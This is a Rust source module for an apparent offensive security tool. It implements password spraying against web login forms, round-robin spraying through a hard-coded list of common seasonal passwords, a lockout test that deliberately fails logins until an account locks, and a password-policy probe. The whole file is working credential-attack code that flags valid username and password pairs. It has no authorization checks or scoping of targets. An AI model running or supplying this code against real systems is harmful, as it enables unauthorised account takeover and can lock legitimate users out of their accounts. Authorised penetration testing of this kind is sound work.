use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

const COMMON_PASSWORDS: &[&str] = &[
    "Winter2024!", "Spring2024!", "Summer2024!", "Fall2024!",
    "Password1!", "Welcome1!", "P@ssw0rd", "Company123!",
    "Changeme1!", "January2024!", "February2024!", "March2024!",
];

pub async fn spray(url: &str, users_file: &str, password: &str, timeout: u64, delay: u64) -> anyhow::Result<()> {
    println!("{} Password Spraying", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Password: {}", "[*]".cyan().bold(), password);
    println!("{} Delay:    {}s", "[*]".cyan().bold(), delay);
    println!("{}", "-".repeat(60).dimmed());

    let users: Vec<String> = std::fs::read_to_string(users_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    let client = build_client(timeout);
    println!("{} Loaded {} users", "[*]".cyan().bold(), users.len());

    let mut found = Vec::new();
    for user in &users {
        let resp = client.post(url).header("Content-Type", "application/x-www-form-urlencoded")
            .body(format!("username={}&password={}", user, password)).send().await;
        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                let success = status == 200 || status == 302 || (status == 401 && !body.contains("invalid") && !body.contains("incorrect"));
                if success { println!("{} [VALID] {}:{}", "[+]".green().bold(), user, password); found.push(user.clone()); }
                else { println!("  {} {} — failed ({})", "*".cyan(), user, status); }
            }
            Err(_) => { println!("  {} {} — error", "*".red(), user); }
        }
        if delay > 0 { tokio::time::sleep(Duration::from_secs(delay)).await; }
    }

    if found.is_empty() { println!("\n{} No valid credentials found.", "[-]".yellow().bold()); }
    else { println!("\n{} {} valid credential(s) found!", "[*]".cyan().bold(), found.len()); }
    Ok(())
}

pub async fn lockout(url: &str, user: &str, timeout: u64, count: u32) -> anyhow::Result<()> {
    println!("{} Lockout Policy Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} User:  {}", "[*]".cyan().bold(), user);
    println!("{} Count: {}", "[*]".cyan().bold(), count);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut locked = false;

    for i in 1..=count {
        let resp = client.post(url).header("Content-Type", "application/x-www-form-urlencoded")
            .body(format!("username={}&password=wrong{}", user, i)).send().await;
        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                let is_locked = body.contains("locked") || body.contains("disabled") || body.contains("account") || status == 423;
                let is_warned = body.contains("remaining") || body.contains("attempts left") || body.contains("locked out");
                let tag = if is_locked { "LOCKED".red().bold().to_string() }
                    else if is_warned { "WARNED".yellow().to_string() }
                    else { "ok".to_string() };
                println!("  {} Attempt {}/{} status={} {}", "*".cyan(), i, count, status, tag);
                if is_locked { locked = true; println!("{} [INFO] Account locked after {} attempts", "[!]".yellow().bold(), i); break; }
                if is_warned { println!("    {} Warning message detected", ">".yellow()); }
            }
            Err(_) => { println!("  {} Attempt {}/{} error", "*".red(), i, count); }
        }
    }

    if !locked { println!("\n{} No lockout detected after {} attempts.", "[-]".yellow().bold(), count); }
    Ok(())
}

pub async fn policy(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Password Policy Detection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let probes = [
        ("Short password (3 chars)", "abc"),
        ("No complexity (all lower)", "password"),
        ("No complexity (all digits)", "12345678"),
        ("Common password", "Password1"),
        ("No special chars", "Password1"),
        ("Min length test (8)", "Test1234"),
        ("Min length test (12)", "Test12345678"),
    ];

    for (name, pwd) in &probes {
        let resp = client.post(url).header("Content-Type", "application/x-www-form-urlencoded")
            .body(format!("username=testuser&password={}&newpassword={}", pwd, pwd)).send().await;
        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                let rejected = body.contains("too short") || body.contains("complexity") || body.contains("require") || body.contains("policy") || status == 400;
                let tag = if rejected { "REJECTED".yellow().to_string() } else { "accepted".green().to_string() };
                println!("  {} {:30} status={} {}", "*".cyan(), name, status, tag);
                if rejected { println!("    {} {}", ">".cyan(), body.chars().take(150).collect::<String>()); }
            }
            Err(_) => { println!("  {} {:30} error", "*".red(), name); }
        }
    }
    println!("\n{} Policy detection complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn round(url: &str, users_file: &str, timeout: u64, delay: u64) -> anyhow::Result<()> {
    println!("{} Round-Robin Password Spraying", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Delay: {}s", "[*]".cyan().bold(), delay);
    println!("{}", "-".repeat(60).dimmed());

    let users: Vec<String> = std::fs::read_to_string(users_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    let client = build_client(timeout);
    let mut found = Vec::new();

    for (round_idx, pwd) in COMMON_PASSWORDS.iter().enumerate() {
        println!("\n{} Round {}/{} — password: {}", "[*]".cyan().bold(), round_idx + 1, COMMON_PASSWORDS.len(), pwd);
        for user in &users {
            let resp = client.post(url).header("Content-Type", "application/x-www-form-urlencoded")
                .body(format!("username={}&password={}", user, pwd)).send().await;
            match resp {
                Ok(r) => {
                    let status = r.status().as_u16();
                    let body = r.text().await.unwrap_or_default();
                    let success = status == 200 || status == 302 || (status == 401 && !body.contains("invalid") && !body.contains("incorrect"));
                    if success { println!("{} [VALID] {}:{}", "[+]".green().bold(), user, pwd); found.push((user.clone(), pwd.to_string())); }
                    else { print!("  {} {} ", "*".dimmed(), user); }
                }
                Err(_) => { print!("  {} {} err ", "*".red(), user); }
            }
            if delay > 0 { tokio::time::sleep(Duration::from_secs(delay)).await; }
        }
    }

    if found.is_empty() { println!("\n{} No valid credentials found.", "[-]".yellow().bold()); }
    else { println!("\n{} {} valid credential(s) found!", "[*]".cyan().bold(), found.len()); }
    Ok(())
}
